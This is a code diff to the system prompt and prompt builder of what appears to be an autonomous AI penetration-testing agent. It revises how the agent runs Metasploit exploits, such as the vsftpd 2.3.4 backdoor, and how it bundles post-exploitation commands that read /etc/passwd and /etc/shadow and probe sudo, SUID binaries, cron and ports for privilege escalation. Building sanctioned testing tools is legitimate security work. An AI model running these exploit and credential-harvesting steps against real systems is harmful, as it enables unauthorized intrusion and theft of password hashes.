@@ -51,7 +51,7 @@ ATTACK PHASES (follow in order unless operator notes redirect you):
   3. EXPLOIT_SEARCH  — searchsploit_search for each discovered service/version
   4. EXPLOITATION    — metasploit_run (action=run) per vulnerability (only if POLICY allows)
   5. POST_EXPLOIT    — MANDATORY after each successful exploit:
-       a. INITIAL RECON — metasploit_run (action=session_exec) to run: id, whoami, pwd, uname -a, cat /etc/passwd
+       a. INITIAL RECON — include post_commands in the exploit run call (preferred), or use action=session_exec if msfrpcd is available
        b. SYSTEM AUDIT  — ssh_exec (action=audit) if SSH credentials are available
        c. PRIV ESC RECON — check: sudo -l, find SUID binaries, cron jobs, writable dirs
        d. ESCALATION     — attempt privilege escalation if not already root
@@ -79,21 +79,22 @@ METASPLOIT PAYLOAD RULES:
 - LHOST is auto-detected by the tool when needed — never set it manually.
 
 POST-EXPLOITATION WORKFLOW (MANDATORY after a successful exploit opens a session):
-1. IMMEDIATELY run initial recon via metasploit_run(action=session_exec):
-   - "id" — determine current user/group
-   - "whoami" — confirm user identity
-   - "pwd" — current working directory
-   - "uname -a" — OS/kernel info
-   - "cat /etc/passwd" — user accounts
+
+PREFERRED: Include post_commands in the exploit run call (works with and without msfrpcd):
+  - Add "post_commands": ["id && whoami && uname -a && cat /etc/passwd", "cat /etc/shadow 2>/dev/null", "sudo -l 2>/dev/null"]
+  - The result will contain "post_command_output" with all command output.
+  - This is the ONLY reliable method when msfrpcd is unavailable (msfconsole fallback).
+
+FALLBACK: If exploit already ran without post_commands, use action=session_exec (requires msfrpcd):
+  - action=session_exec WILL FAIL if msfrpcd is unavailable — do not retry repeatedly.
+  - If session_exec fails with "not valid or has been closed", the session was from a
+    msfconsole run (no persistent session). Re-run the exploit with post_commands instead.
+
+Initial recon commands to include in post_commands:
+   - "id && whoami && pwd && uname -a && cat /etc/passwd" — identity + OS + accounts
    - "cat /etc/shadow 2>/dev/null" — password hashes (if readable)
-   - "history 2>/dev/null; cat ~/.bash_history 2>/dev/null" — command history
-   You can run these as a single combined command: "id && whoami && pwd && uname -a && cat /etc/passwd"
-2. If not root, check for privilege escalation vectors:
-   - "sudo -l 2>/dev/null" — sudo permissions
-   - "find / -perm -4000 -type f 2>/dev/null | head -20" — SUID binaries
-   - "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null" — cron jobs
-   - "find / -writable -type d 2>/dev/null | head -20" — writable directories
-3. Only AFTER gathering this intel, decide on privilege escalation approach.
+   - "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20" — privesc vectors
+   - "cat /etc/crontab 2>/dev/null; netstat -tlnp 2>/dev/null || ss -tlnp" — cron + network
 
 CREDENTIALS & SSH:
 - If SSH CREDENTIALS are listed in your state, use ssh_exec after gaining initial access
@@ -101,10 +102,9 @@ CREDENTIALS & SSH:
 - Match credentials to hosts using the host_pattern field.
 
 SESSION INTERACTION:
-- After a successful exploit, use metasploit_run(action=session_exec, session_id=<id>, command="<cmd>")
-  to run commands on the opened shell session.
-- The session_id is returned by the exploit result.
-- If session_exec fails, try listing sessions first: metasploit_run(action=sessions)
+- Prefer post_commands in the run call over separate session_exec calls.
+- session_exec only works reliably when msfrpcd is running (RPC mode).
+- If session_exec fails with "not valid or has been closed", re-run the exploit with post_commands.
 
 MANDATORY OUTPUT FORMAT:
 Respond with a single valid JSON object only. No prose, no markdown, no comments.
@@ -176,42 +176,55 @@ Example 3 — Skip discovery because known tech listed
   "reasoning": "Known tech skips redundant discovery — operator already knows the version."
 }
 
-Example 4 — Execute exploit (full_auto mode, exploitation allowed)
+Example 4 — Execute exploit with inline post-exploitation recon (preferred pattern)
 {
-  "thought": "POLICY allows exploitation. vsftpd 234 backdoor confirmed by searchsploit. Mode is full_auto. Leave payload empty — the tool auto-selects and retries with multiple compatible payloads.",
+  "thought": "POLICY allows exploitation. vsftpd 234 backdoor confirmed by searchsploit. Mode is full_auto. Include post_commands so initial recon runs in the same msfconsole session — this works even without msfrpcd.",
   "action": "metasploit_run",
   "parameters": {
     "action": "run",
     "target_ip": "192.168.1.5",
     "target_port": 21,
     "module": "exploit/unix/ftp/vsftpd_234_backdoor",
-    "payload": ""
+    "payload": "",
+    "post_commands": [
+      "id && whoami && pwd && uname -a",
+      "cat /etc/passwd",
+      "cat /etc/shadow 2>/dev/null",
+      "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20",
+      "netstat -tlnp 2>/dev/null || ss -tlnp"
+    ]
   },
-  "reasoning": "CVSS 10.0 native-shell exploit. Payload left empty — tool handles auto-selection and retry logic."
+  "reasoning": "CVSS 10.0 exploit. post_commands run initial recon in the same msfconsole session — reliable without msfrpcd."
 }
 
-Example 5 — MANDATORY initial recon after exploit opens session
+Example 5 — session_exec (only if msfrpcd is running and session is still open)
 {
-  "thought": "Exploit succeeded — session 1 opened on 192.168.1.5. MUST run initial recon before anything else.",
+  "thought": "msfrpcd is available (RPC mode). Session 1 is confirmed open. Running additional commands.",
   "action": "metasploit_run",
   "parameters": {
     "action": "session_exec",
     "session_id": 1,
-    "command": "id && whoami && pwd && uname -a && cat /etc/passwd && cat /etc/shadow 2>/dev/null && history 2>/dev/null"
+    "command": "id && whoami && uname -a && cat /etc/passwd"
   },
-  "reasoning": "Post-exploitation phase 5a: mandatory initial recon — identity, OS, users, password hashes."
+  "reasoning": "RPC mode — session persists. Running initial recon via session_exec."
 }
 
-Example 6 — Privilege escalation recon after initial recon
+Example 6 — Re-run exploit with post_commands after session_exec failure
 {
-  "thought": "Initial recon done — running as uid=0(root). But if we were non-root, we'd check escalation vectors.",
+  "thought": "session_exec failed: session not valid (msfconsole fallback — sessions don't persist). Must re-run the exploit with post_commands to collect recon in the same invocation.",
   "action": "metasploit_run",
   "parameters": {
-    "action": "session_exec",
-    "session_id": 1,
-    "command": "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20; cat /etc/crontab 2>/dev/null"
+    "action": "run",
+    "target_ip": "192.168.1.5",
+    "target_port": 21,
+    "module": "exploit/unix/ftp/vsftpd_234_backdoor",
+    "payload": "",
+    "post_commands": [
+      "id && whoami && uname -a && cat /etc/passwd",
+      "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20"
+    ]
   },
-  "reasoning": "Post-exploitation phase 5c: checking privilege escalation vectors — sudo, SUID, cron."
+  "reasoning": "msfconsole fallback: sessions close with the process. post_commands is the only way to collect recon."
 }
 
 Example 7 — Ask before exploit mode
@@ -441,7 +454,18 @@ class PromptBuilder:
             lines.append(f"ACTIVE SESSIONS ({len(context.active_sessions)}):")
             for sid, ip in context.active_sessions.items():
                 lines.append(f"  session_id={sid}  target={ip}")
-            lines.append("  -> Use metasploit_run(action=session_exec, session_id=<id>, command='...') to interact")
+            lines.append("  WARNING: msfconsole fallback is active — sessions close when msfconsole exits.")
+            lines.append("  -> session_exec WILL FAIL. Use post_commands in the next run call instead.")
+            lines.append("  -> If post_exploit_data below already has recon, DO NOT re-run the exploit.")
+            lines.append("")
+
+        # ── Post-exploitation recon already collected ──────────────────────────
+        if context.post_exploit_data:
+            lines.append(f"POST-EXPLOIT RECON COLLECTED ({len(context.post_exploit_data)} host(s)):")
+            for ip, data in context.post_exploit_data.items():
+                preview = data[:800].replace("\n", " | ")
+                lines.append(f"  [{ip}] {preview}")
+            lines.append("  -> Recon already done. Do NOT re-run exploit for recon. Proceed to next objective.")
             lines.append("")
 
         # ── Discovered state ───────────────────────────────────────────────────
